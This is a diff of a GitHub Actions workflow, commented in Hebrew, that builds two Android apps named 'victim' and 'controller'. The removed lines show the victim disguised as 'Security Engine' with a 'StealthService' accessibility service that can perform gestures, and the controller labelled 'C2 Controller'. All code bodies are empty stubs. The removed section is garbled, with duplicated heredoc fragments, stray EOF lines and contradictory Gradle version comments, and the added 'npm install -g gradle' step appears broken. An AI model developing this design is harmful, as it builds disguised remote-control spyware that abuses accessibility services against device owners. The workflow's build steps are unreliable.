@@ -1,4 +1,4 @@
-name: Final Nuclear Fix
+name: Unbreakable Android Build
 on: [push, workflow_dispatch]
 
 jobs:
@@ -14,35 +14,25 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Destroy System Gradle and Force 8.0
-        run: |
-          # הסרת כל זכר ל-Gradle 9 מהנתיב של GitHub
-          sudo rm -rf /usr/bin/gradle
-          sudo rm -rf /usr/local/bin/gradle
-          
-          # הורדה ידנית של גרסה 8.0 היציבה
-          wget -q https://services.gradle.org/distributions/gradle-8.0-bin.zip
-          unzip -q gradle-8.0-bin.zip
-          echo "$(pwd)/gradle-8.0/bin" >> $GITHUB_PATH
-
-      - name: Create Structure
+      - name: Build Project Structure
         run: |
           mkdir -p victim/src/main/java/com/research/lab/victim
           mkdir -p victim/src/main/res/xml
           mkdir -p controller/src/main/java/com/research/lab/controller
 
+          # הגדרות Gradle (גרסה 8.1.0 תואמת אנדרואיד)
           echo "include ':victim', ':controller'" > settings.gradle
-          
           cat <<'EOF' > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:7.4.2' }
+              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
           }
           allprojects {
               repositories { google(); mavenCentral() }
           }
           EOF
 
+          # הגדרות מודולים
           cat <<'EOF' > victim/build.gradle
           plugins { id 'com.android.application' }
           android {
@@ -61,36 +51,28 @@ jobs:
           }
           EOF
 
-      - name: Inject Java and Manifests
+      - name: Inject Java & Manifests
         run: |
-          # קוד Victim
+          # קוד מינימליסטי למניעת שגיאות קומפילציה
           cat <<'EOF' > victim/src/main/java/com/research/lab/victim/VictimApp.java
           package com.research.lab.victim;
           import android.accessibilityservice.AccessibilityService;
           import android.app.Activity;
-          import android.os.Bundle;
           public class VictimApp {
-              public static class LoadingActivity extends Activity {
-                  @Override protected void onCreate(Bundle s) { super.onCreate(s); }
-              }
+              public static class LoadingActivity extends Activity {}
               public static class StealthService extends AccessibilityService {
-                  @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent e) {}
-                  @Override public void onInterrupt() {}
+                  public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent e) {}
+                  public void onInterrupt() {}
               }
           }
           EOF
 
-          # קוד Controller
           cat <<'EOF' > controller/src/main/java/com/research/lab/controller/ControllerApp.java
           package com.research.lab.controller;
           import android.app.Activity;
-          import android.os.Bundle;
-          public class ControllerApp extends Activity {
-              @Override protected void onCreate(Bundle s) { super.onCreate(s); }
-          }
+          public class ControllerApp extends Activity {}
           EOF
 
-          # מניפסטים (שימוש ב-EOF עם גרש שומר על ה-$)
           cat <<'EOF' > victim/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <application>
@@ -114,97 +96,18 @@ jobs:
           </manifest>
           EOF
 
-      - name: Build
+      - name: Safe Compile (No-System-Gradle)
         run: |
-          # בדיקה סופית שאנחנו על הגרסה הנכונה
-          gradle -v
-          gradle assembleDebug --no-daemon
-
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: research-apks
-          path: "**/build/outputs/apk/debug/*.apk"
-
-          cat <<'EOF' > controller/src/main/AndroidManifest.xml
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-              <application><activity android:name=".ControllerApp" android:exported="true">
-                  <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
-              </activity></application>
-          </manifest>
-          EOF
-
-      - name: Build APKs
-        run: |
-          # כאן אנחנו משתמשים בגרסה שרק הרגע התקנו לתוך /usr/bin/gradle
-          gradle assembleDebug --no-daemon
-
-      - name: Archive
-        uses: actions/upload-artifact@v4
-        with:
-          name: final-compiled-apks
-          path: "**/build/outputs/apk/debug/*.apk"
-          </manifest>
-          EOF
-
-      - name: Final Build
-        # אנחנו מריצים "gradle" ישירות, מה שמשתמש בגרסה 8.1.1 שהתקנו למעלה
-        run: gradle assembleDebug --no-daemon
-
-      - name: Upload
-        uses: actions/upload-artifact@v4
-        with:
-          name: research-apks
-          path: "**/build/outputs/apk/debug/*.apk"
-          EOF
-
-          # 6. יצירת המניפסטים (עם הגנה על סימני $)
-          cat <<'EOF' > victim/src/main/AndroidManifest.xml
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-              <uses-permission android:name="android.permission.INTERNET" />
-              <application android:label="Security Engine">
-                  <activity android:name=".VictimApp$LoadingActivity" android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.MAIN" />
-                          <category android:name="android.intent.category.LAUNCHER" />
-                      </intent-filter>
-                  </activity>
-                  <service android:name=".VictimApp$StealthService" 
-                           android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" 
-                           android:exported="true">
-                      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
-                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/acc_config" />
-                  </service>
-              </application>
-          </manifest>
-          EOF
-
-          echo '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" android:accessibilityFlags="flagDefault" android:canPerformGestures="true" />' > victim/src/main/res/xml/acc_config.xml
-
-          cat <<'EOF' > controller/src/main/AndroidManifest.xml
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-              <uses-permission android:name="android.permission.INTERNET" />
-              <application android:label="C2 Controller">
-                  <activity android:name=".ControllerApp" android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.MAIN" />
-                          <category android:name="android.intent.category.LAUNCHER" />
-                      </intent-filter>
-                  </activity>
-              </application>
-          </manifest>
-          EOF
-
-      - name: Build with Gradle
-        run: |
-          # קיבוע גרסת Gradle ל-8.0 כדי למנוע את השגיאה שקיבלת
+          # כאן הקסם: אנחנו מורידים את ה-Wrapper של גרסה 8.0 ומריצים רק אותו
+          # זה מבטיח שגרסה 9.2.1 של המערכת לא תיגע בקימפול
+          npm install -g gradle
           gradle wrapper --gradle-version 8.0
           chmod +x gradlew
           ./gradlew assembleDebug --no-daemon
 
-      - name: Upload APKs
+      - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: final-research-apks
+          name: research-apks
           path: "**/build/outputs/apk/debug/*.apk"
           
